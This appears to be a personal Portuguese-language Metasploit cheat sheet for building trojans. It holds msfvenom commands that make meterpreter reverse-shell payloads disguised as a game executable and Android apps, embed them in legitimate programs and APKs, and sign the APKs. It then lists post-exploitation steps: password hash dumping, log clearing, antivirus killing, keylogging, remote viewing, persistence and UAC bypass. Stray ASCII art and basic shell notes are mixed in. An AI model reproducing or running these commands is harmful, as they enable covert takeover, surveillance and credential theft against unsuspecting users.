msfvenom --help-formmats  ==== ver os formatos de arquivos.


CRIAR UM CODIO USANDO O METERPRETER

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.113 LPORT=1234 -f exe > jogo.exe

agora definir a payload.

msf> use multi/handler

set payload windows/meterpreter/reverse_tcp
set lhost ip
set lport 1234
======================================

comando do meterpreter

#hashdump => senha da maquina

====================================juntando trojan com exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.113 LPORT=1234 -x programa.exe -k -f exe > programa2.exe

para migrar o processo use:

run post/windows/manage/migrate

ou migrate numerodoprocesso

ver processos: ps

limpa rastros: clearev

matar antivirus: run killav

desabilitar o acesso da pessoa:
uictl disable mouse

keyscan_start
keyscan_dump

ver a maquina do usuario.
run vnc

===================================

reconectar mesmo que desconect

run persistence -h

run persistence -r 192.meu.ip.1.13 -p 1234 -i 5 -U -X
=================================
getsystem === pedir perivilegios de adm

para burla:
use exploit/windows/local/bypassuac

============================
codigo para iniciar o apache

service apache2 start
service apache2 status

local dos arquivos[[[[
/var/www/html


cp  == copia
rm == remove

mv == move

print('''
  JJJJJ  K   K  CCCCC   OOO   RRRRR   PPPP 
    J    K  K  C       O   O  R   R   P   P
    J    KKK   C       O   O  RRRRR   PPPP 
J   J    K  K  C       O   O  R  R    P    
 JJJ     K   K  CCCCC   OOO   R   R   P    
''')



exemplo:
cp xxxx xx/xx/xxx


--------------------------------------
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.113 LPORT=4444 R > /root/mortalcombate.apk


============assinar apk================

apt install apksigner  ==== instalar

agora gerar a chave:
----------------------
keytool -genkey -v -keystore aplicativo.keystore -alias exemplo -keyalg RSA -keysize 2048 -validity 10000

as informações so dar enter

por ultimo dar "sim"

---------------------------------
jarsigner -verbose -sigalg SHA1whithRSA -digestalg SHA1 -keystore aplicativo.keystore nomedoapk.apk exemplo

apksigner sign --ks aplicativo.keystore -out testeassinado.apk testenaoassinado.apk


set Exit0nSession false   ==== não encerra a sess~]ao

exploit -j ==== rodar em backgroud

jobs === mostra os processos

sessions -l


========================================== embutindo payload ++++++++

msfvenom -x 'nomedoappbaixado.apk' -p android/meterpreter/reverse_tcp lhost=192.168.1.100 lport=4444 -o nomedoapk2.apk





para isso precisamos do APKTOOL

instalação: apt install apktool





